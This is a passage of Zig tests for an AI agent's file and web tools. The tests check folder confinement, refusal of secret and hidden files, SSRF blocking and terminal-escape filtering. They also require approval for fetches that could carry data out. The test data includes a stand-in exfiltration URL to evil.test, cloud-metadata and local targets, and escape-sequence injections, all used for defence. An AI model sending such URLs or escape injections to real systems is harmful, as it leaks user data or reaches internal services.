        .{ .path = "notes.txt", .want = try std.mem.concat(allocator, u8, &.{ root, "/notes.txt" }) },
        .{ .path = abs_new, .want = try allocator.dupe(u8, abs_new) },
        .{ .path = "", .want = null },
        .{ .path = "sub/", .want = null },
        .{ .path = "sub/.", .want = null },
        .{ .path = ".dot.md", .want = null },
        .{ .path = "sub.env/x.md", .want = null },
        .{ .path = "dirlink/through.md", .want = null },
        .{ .path = "elsewhere/away.md", .want = null },
        .{ .path = abs_up, .want = null },
    }) |c| {
        defer if (c.want) |w| allocator.free(w);
        switch (try confineNewPath(allocator, io, root, c.path)) {
            .ok => |got| {
                defer allocator.free(got);
                testing.expectEqualStrings(c.want orelse "(refused)", got) catch |err| {
                    std.debug.print("confineNewPath {s} -> {s}\n", .{ c.path, got });
                    return err;
                };
            },
            .refused => |msg| {
                testing.expect(c.want == null and msg.len > 0) catch |err| {
                    std.debug.print("confineNewPath {s} refused: {s}\n", .{ c.path, msg });
                    return err;
                };
            },
        }
    }
}

test "repl tools: a replaced file keeps its permissions" {
    const allocator = testing.allocator;
    const io = testing.io;
    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();
    const root = try writeFixture(&tmp, allocator);
    defer allocator.free(root);
    try tmp.dir.writeFile(io, .{ .sub_path = "proj/run.sh", .data = "echo hi\n" });
    try tmp.dir.setFilePermissions(io, "proj/run.sh", .fromMode(0o751), .{});
    const ctx: Context = .{ .allocator = allocator, .io = io, .root = root, .vision = false, .writable = true };

    for ([_][2][]const u8{
        .{ "edit_file", "{\"path\":\"run.sh\",\"old_string\":\"hi\",\"new_string\":\"yo\"}" },
        .{ "write_file", "{\"path\":\"run.sh\",\"content\":\"echo ok\\n\"}" },
    }) |c| {
        const text = try runForTest(ctx, c[0], c[1]);
        defer allocator.free(text);
        try testing.expect(!std.mem.startsWith(u8, text, "error") and !std.mem.startsWith(u8, text, "refused"));
        const st = try tmp.dir.statFile(io, "proj/run.sh", .{});
        try testing.expectEqual(@as(std.posix.mode_t, 0o751), st.permissions.toMode() & 0o7777);
    }
}

test "repl tools: the write tools count as file tools for the fetch approval" {
    try testing.expect(isWriteTool("write_file") and isWriteTool("edit_file"));
    try testing.expect(!isWriteTool("read_file"));
    try testing.expect(isFileTool("write_file") and isFileTool("edit_file"));
}

test "repl tools: after /cd the file tools are confined to the new folder, just as strictly" {
    const allocator = testing.allocator;
    const io = testing.io;
    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();
    try tmp.dir.createDirPath(io, "proj/sub");
    try tmp.dir.writeFile(io, .{ .sub_path = "proj/notes.txt", .data = "parent note\n" });
    try tmp.dir.writeFile(io, .{ .sub_path = "proj/sub/a.txt", .data = "inside\n" });
    try tmp.dir.writeFile(io, .{ .sub_path = "proj/sub/.env", .data = "KEY=1\n" });
    try tmp.dir.symLink(io, "../notes.txt", "proj/sub/up.txt", .{});
    const start = try tmp.dir.realPathFileAlloc(io, "proj", allocator);
    defer allocator.free(start);
    const parent_note = try std.fmt.allocPrint(allocator, "{{\"path\":\"{s}/notes.txt\"}}", .{start});
    defer allocator.free(parent_note);

    const root = switch (try changeRoot(allocator, io, start, "/nonexistent", "sub")) {
        .ok => |r| r,
        .refused => return error.CdRefused,
    };
    defer allocator.free(root);
    const ctx: Context = .{ .allocator = allocator, .io = io, .root = root, .vision = false };

    const Case = struct { name: []const u8, args: []const u8, prefix: []const u8 = "", has: []const []const u8 = &.{}, lacks: []const []const u8 = &.{} };
    for ([_]Case{
        .{ .name = "read_file", .args = "{\"path\":\"a.txt\"}", .prefix = "inside\n" },
        .{ .name = "read_file", .args = "{\"path\":\"../notes.txt\"}", .prefix = "refused:", .has = &.{"/cd <folder>"} },
        .{ .name = "read_file", .args = parent_note, .prefix = "refused:", .has = &.{"/cd <folder>"} },
        .{ .name = "read_file", .args = "{\"path\":\"up.txt\"}", .prefix = "refused:" },
        .{ .name = "read_file", .args = "{\"path\":\".env\"}", .prefix = "refused:" },
        .{ .name = "list_dir", .args = "{}", .has = &.{"a.txt"}, .lacks = &.{ "notes.txt", ".env" } },
        .{ .name = "search_files", .args = "{\"pattern\":\"note\"}", .prefix = "no matches" },
    }) |c| {
        const text = try runForTest(ctx, c.name, c.args);
        defer allocator.free(text);
        try expectStartsWith(c.prefix, text);
        for (c.has) |h| try expectContains(h, text, true);
        for (c.lacks) |h| try expectContains(h, text, false);
    }
}

test "repl tools: the user's /image: relative paths stay in the folder, absolute ones may leave it but not for secrets" {
    const allocator = testing.allocator;
    const io = testing.io;
    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();
    const png = "\x89PNG\r\n\x1a\n\x00\x00\x00\x0dIHDR";
    try tmp.dir.createDirPath(io, "proj/shots");
    try tmp.dir.createDirPath(io, "Desktop/.cache");
    try tmp.dir.createDirPath(io, "Desktop/.aws");
    try tmp.dir.writeFile(io, .{ .sub_path = "proj/shots/pic.png", .data = png });
    try tmp.dir.writeFile(io, .{ .sub_path = "proj/.hidden.png", .data = png });
    try tmp.dir.writeFile(io, .{ .sub_path = "proj/id_card.png", .data = png });
    try tmp.dir.writeFile(io, .{ .sub_path = "proj/notes.txt", .data = "not an image\n" });
    try tmp.dir.writeFile(io, .{ .sub_path = "outside.png", .data = png });
    try tmp.dir.writeFile(io, .{ .sub_path = "Desktop/shot.png", .data = png });
    try tmp.dir.writeFile(io, .{ .sub_path = "Desktop/.cache/thumb.png", .data = png });
    try tmp.dir.writeFile(io, .{ .sub_path = "Desktop/.shot.png", .data = png });
    try tmp.dir.writeFile(io, .{ .sub_path = "Desktop/.aws/diagram.png", .data = png });
    try tmp.dir.writeFile(io, .{ .sub_path = "Desktop/id_scan.png", .data = png });
    try tmp.dir.symLink(io, "../outside.png", "proj/link.png", .{});
    try tmp.dir.symLink(io, "id_scan.png", "Desktop/innocent.png", .{});
    const home = try tmp.dir.realPathFileAlloc(io, ".", allocator);
    defer allocator.free(home);
    const root = try tmp.dir.realPathFileAlloc(io, "proj", allocator);
    defer allocator.free(root);
    const abs = struct {
        fn of(a: std.mem.Allocator, dir: []const u8, rel: []const u8) ![]u8 {
            return std.fmt.allocPrint(a, "{s}/{s}", .{ dir, rel });
        }
    }.of;
    const outside_abs = try abs(allocator, root, "../outside.png");
    defer allocator.free(outside_abs);
    const shot_abs = try abs(allocator, home, "Desktop/shot.png");
    defer allocator.free(shot_abs);
    const in_hidden_abs = try abs(allocator, home, "Desktop/.cache/thumb.png");
    defer allocator.free(in_hidden_abs);
    const hidden_abs = try abs(allocator, home, "Desktop/.shot.png");
    defer allocator.free(hidden_abs);
    const secret_dir_abs = try abs(allocator, home, "Desktop/.aws/diagram.png");
    defer allocator.free(secret_dir_abs);
    const secret_abs = try abs(allocator, home, "Desktop/id_scan.png");
    defer allocator.free(secret_abs);
    const secret_link_abs = try abs(allocator, home, "Desktop/innocent.png");
    defer allocator.free(secret_link_abs);

    const Case = struct { path: []const u8, ok: bool, says: []const u8 = "" };
    for ([_]Case{
        .{ .path = "shots/pic.png", .ok = true },
        .{ .path = "./shots/pic.png", .ok = true },
        .{ .path = "shots/../shots/pic.png", .ok = false, .says = "/cd" },
        .{ .path = "../outside.png", .ok = false, .says = "/cd" },
        .{ .path = "link.png", .ok = false, .says = "/cd" },
        .{ .path = ".hidden.png", .ok = false, .says = "hidden" },
        .{ .path = "id_card.png", .ok = false, .says = "secrets" },
        .{ .path = "notes.txt", .ok = false, .says = "not a PNG" },
        .{ .path = "missing.png", .ok = false, .says = "no such file" },
        .{ .path = outside_abs, .ok = true },
        .{ .path = shot_abs, .ok = true },
        .{ .path = "~/Desktop/shot.png", .ok = true },
        .{ .path = in_hidden_abs, .ok = true },
        .{ .path = hidden_abs, .ok = false, .says = "hidden" },
        .{ .path = secret_dir_abs, .ok = false, .says = "secrets" },
        .{ .path = secret_abs, .ok = false, .says = "secrets" },
        .{ .path = secret_link_abs, .ok = false, .says = "secrets" },
        .{ .path = "~/Desktop/missing.png", .ok = false, .says = "no such file" },
    }) |c| {
        switch (try loadUserImage(allocator, io, root, home, c.path)) {
            .ok => |url| {
                defer allocator.free(url);
                testing.expect(c.ok) catch |err| {
                    std.debug.print("/image {s} attached\n", .{c.path});
                    return err;
                };
                try expectStartsWith("data:image/png;base64,", url);
            },
            .refused => |msg| {
                testing.expect(!c.ok and !std.mem.startsWith(u8, msg, "refused:")) catch |err| {
                    std.debug.print("/image {s} refused: {s}\n", .{ c.path, msg });
                    return err;
                };
                try expectContains(c.says, msg, true);
            },
        }
    }

    // The model's own view_image stays confined for the same absolute path.
    const args = try std.fmt.allocPrint(allocator, "{{\"path_or_url\":\"{s}\"}}", .{shot_abs});
    defer allocator.free(args);
    const text = try runForTest(.{ .allocator = allocator, .io = io, .root = root, .vision = true }, "view_image", args);
    defer allocator.free(text);
    try expectStartsWith("refused:", text);
}

test "repl tools: web tools refuse local, private and non-http targets before connecting" {
    const allocator = testing.allocator;
    const ctx: Context = .{ .allocator = allocator, .io = testing.io, .root = "/nonexistent", .vision = true };
    for ([_][]const u8{
        "http://127.0.0.1/",
        "http://localhost:8080/admin",
        "http://LOCALHOST./",
        "https://printer.local/",
        "http://10.0.0.1/",
        "http://169.254.169.254/latest/meta-data/",
        "http://[::1]:12345/v1/models",
        "http://[fe80::1]/",
        "http://100.100.100.100/",
        "http://user:pw@example.com/",
        "file:///etc/passwd",
        "ftp://example.com/",
        "not a url",
    }) |url| {
        const args = try std.fmt.allocPrint(allocator, "{{\"url\":\"{s}\"}}", .{url});
        defer allocator.free(args);
        const text = try runForTest(ctx, "fetch_url", args);
        defer allocator.free(text);
        try expectStartsWith("refused:", text);
    }
    const img = try runForTest(ctx, "view_image", "{\"path_or_url\":\"http://192.168.1.10/cam.jpg\"}");
    defer allocator.free(img);
    try expectStartsWith("refused:", img);
}

test "repl tools: the tool list offers view_image only to a vision model, the write tools only when editing is on, and each call traces one line" {
    const allocator = testing.allocator;
    const Pack = struct { vision: bool, writable: bool, want: []const u8 };
    for ([_]Pack{
        .{ .vision = false, .writable = false, .want = "web_search fetch_url read_file list_dir search_files " },
        .{ .vision = true, .writable = false, .want = "web_search fetch_url read_file list_dir search_files view_image " },
        .{ .vision = false, .writable = true, .want = "web_search fetch_url read_file list_dir search_files write_file edit_file " },
        .{ .vision = true, .writable = true, .want = "web_search fetch_url read_file list_dir search_files view_image write_file edit_file " },
    }) |p| {
        var parsed = try std.json.parseFromSlice(std.json.Value, allocator, definitionsJson(p.vision, p.writable), .{});
        defer parsed.deinit();
        var names = std.ArrayList(u8).empty;
        defer names.deinit(allocator);
        for (parsed.value.array.items) |t| {
            try testing.expectEqualStrings("function", t.object.get("type").?.string);
            try names.appendSlice(allocator, t.object.get("function").?.object.get("name").?.string);
            try names.append(allocator, ' ');
        }
        try testing.expectEqualStrings(p.want, names.items);
    }
    const Case = struct { name: []const u8, args: []const u8, line: []const u8 };
    for ([_]Case{
        .{ .name = "web_search", .args = "{\"query\":\"zig latest release\"}", .line = "search: zig latest release" },
        .{ .name = "fetch_url", .args = "{\"url\":\"https://ziglang.org/download/\"}", .line = "fetch: https://ziglang.org/download/" },
        .{ .name = "read_file", .args = "{\"path\":\"README.md\"}", .line = "read: README.md" },
        .{ .name = "write_file", .args = "{\"path\":\"n.md\",\"content\":\"x\"}", .line = "write: n.md" },
        .{ .name = "edit_file", .args = "{\"path\":\"sub/n.md\",\"old_string\":\"x\"}", .line = "edit: sub/n.md" },
        .{ .name = "list_dir", .args = "{}", .line = "list: ." },
        .{ .name = "search_files", .args = "{\"pattern\":\"TODO\",\"path\":\"src\"}", .line = "grep: TODO in src" },
        .{ .name = "view_image", .args = "{\"path_or_url\":\"shot.png\"}", .line = "view: shot.png" },
        .{ .name = "mystery", .args = "{\"a\":1}", .line = "mystery: {\"a\":1}" },
    }) |c| {
        const line = try traceLine(allocator, c.name, c.args);
        defer allocator.free(line);
        try testing.expectEqualStrings(c.line, line);
    }
}

test "repl tools: links and redirects resolve against the page url" {
    const allocator = testing.allocator;
    const base = "https://example.org/docs/page.html?x=1#top";
    const Case = struct { ref: []const u8, want: ?[]const u8 };
    for ([_]Case{
        .{ .ref = "https://other.net/a", .want = "https://other.net/a" },
        .{ .ref = "//cdn.example.org/x.png", .want = "https://cdn.example.org/x.png" },
        .{ .ref = "/download/", .want = "https://example.org/download/" },
        .{ .ref = "next.html", .want = "https://example.org/docs/next.html" },
        .{ .ref = "?page=2", .want = "https://example.org/docs/page.html?page=2" },
        .{ .ref = "#section", .want = null },
        .{ .ref = "mailto:a@b.c", .want = null },
        .{ .ref = "javascript:void(0)", .want = null },
    }) |c| {
        const got = try resolveUrl(allocator, base, c.ref);
        defer if (got) |g| allocator.free(g);
        if (c.want) |w| try testing.expectEqualStrings(w, got.?) else try testing.expect(got == null);
    }
    const root_rel = (try resolveUrl(allocator, "https://example.org", "a.html")).?;
    defer allocator.free(root_rel);
    try testing.expectEqualStrings("https://example.org/a.html", root_rel);
}

test "repl tools: page images expose resolved public-scheme URLs for vision workflows" {
    const a = testing.allocator;
    const text = try htmlToText(a, "<p>Photos</p><img alt=\"Cat &amp; dog\" src=\"/cat.png\"><img src=\"data:image/png;base64,x\"><img data-src=\"../bird.jpg\" alt=\"Bird\">", "https://example.com/news/", 20000);
    defer a.free(text);
    try testing.expect(std.mem.indexOf(u8, text, "Cat & dog (https://example.com/cat.png)") != null);
    try testing.expect(std.mem.indexOf(u8, text, "Bird (https://example.com/news/../bird.jpg)") != null);
    try testing.expect(std.mem.indexOf(u8, text, "data:") == null);
}

fn filterChunks(allocator: std.mem.Allocator, chunks: []const []const u8) ![]u8 {
    var out: std.Io.Writer.Allocating = .init(allocator);
    defer out.deinit();
    var f: TermFilter = .{};
    for (chunks) |c| try f.write(&out.writer, c);
    return out.toOwnedSlice();
}

test "repl tools: the terminal filter drops escapes and control bytes and keeps text" {
    const allocator = testing.allocator;
    const Case = struct { in: []const []const u8, out: []const u8 };
    for ([_]Case{
        .{ .in = &.{"fetch: https://a\rhttps://b"}, .out = "fetch: https://ahttps://b" },
        .{ .in = &.{"x\x1b[2Ky\x1b[1;31mz"}, .out = "xyz" },
        .{ .in = &.{"\x1b]0;title\x07ok"}, .out = "ok" },
        .{ .in = &.{"\x1b]8;;http://x\x1b\\link"}, .out = "link" },
        .{ .in = &.{"a\x1bcb\x1b(Bc"}, .out = "abc" },
        .{ .in = &.{"a\tb\nc \xc3\xa9 \xe6\x97\xa5\xc2\xa0"}, .out = "a\tb\nc \xc3\xa9 \xe6\x97\xa5\xc2\xa0" },
        .{ .in = &.{"a\x7fb\x00c\x08d\x07"}, .out = "abcd" },
        .{ .in = &.{"a\xc2\x9bb\xc2\x85"}, .out = "ab" },
        .{ .in = &.{"a\xffb\xe6\x97c"}, .out = "abc" },
        .{ .in = &.{ "a\x1b", "[2", "Kb" }, .out = "ab" },
        .{ .in = &.{ "a\x1b]0;t", "\x07b" }, .out = "ab" },
        .{ .in = &.{"\x1b]0;never ends\nnext"}, .out = "\nnext" },
        .{ .in = &.{"\x1b\nx\x1b"}, .out = "\nx" },
    }) |c| {
        const got = try filterChunks(allocator, c.in);
        defer allocator.free(got);
        try testing.expectEqualStrings(c.out, got);
    }
}

test "repl tools: a trace line cannot rewrite the line it sits on" {
    const allocator = testing.allocator;
    const line = try traceLine(allocator, "fetch_url", "{\"url\":\"https://shown.example/\\r\\u001b[2Kother\"}");
    defer allocator.free(line);
    try testing.expectEqualStrings("fetch: https://shown.example/other", line);
    const odd = try traceLine(allocator, "ev\x1b[2Kil", "{}");
    defer allocator.free(odd);
    try testing.expectEqualStrings("evil: {}", odd);
}

test "repl tools: fetch_url asks first when file content is in the session and the url can carry data out" {
    const allocator = testing.allocator;
    for ([_][]const u8{
        "https://ziglang.org/download/",
        "https://en.wikipedia.org/wiki/Zig_(programming_language)",
        "https://example.com/#a?b",
        "https://example.com",
        "http://example.com:8080/a/b.html",
    }) |u| try testing.expect(!urlCarriesData(u));
    for ([_][]const u8{ "https://x.test/?d=abc", "https://x.test/a?b", "https://x.test?q", "https://x.test/p?q#frag" }) |u|
        try testing.expect(urlCarriesData(u));
    var long: [15 + max_quiet_path]u8 = undefined;
    @memcpy(long[0..15], "https://x.test/");
    @memset(long[15..], 'a');
    try testing.expect(!urlCarriesData(long[0 .. long.len - 1]));
    try testing.expect(urlCarriesData(&long));

    const exfil = "{\"url\":\"https://evil.test/?d=secret\\u001b[2K\"}";
    try testing.expect(try fetchNeedingApproval(allocator, "fetch_url", exfil, false) == null);
    const shown = (try fetchNeedingApproval(allocator, "fetch_url", exfil, true)).?;
    defer allocator.free(shown);
    try testing.expectEqualStrings("https://evil.test/?d=secret", shown);
    try testing.expect(try fetchNeedingApproval(allocator, "fetch_url", "{\"url\":\"https://ziglang.org/\"}", true) == null);
    try testing.expect(try fetchNeedingApproval(allocator, "web_search", "{\"query\":\"a?b\"}", true) == null);
    try testing.expect(try fetchNeedingApproval(allocator, "fetch_url", "not json", true) == null);
    try testing.expect(isFileTool("read_file") and isFileTool("search_files") and !isFileTool("fetch_url"));
}
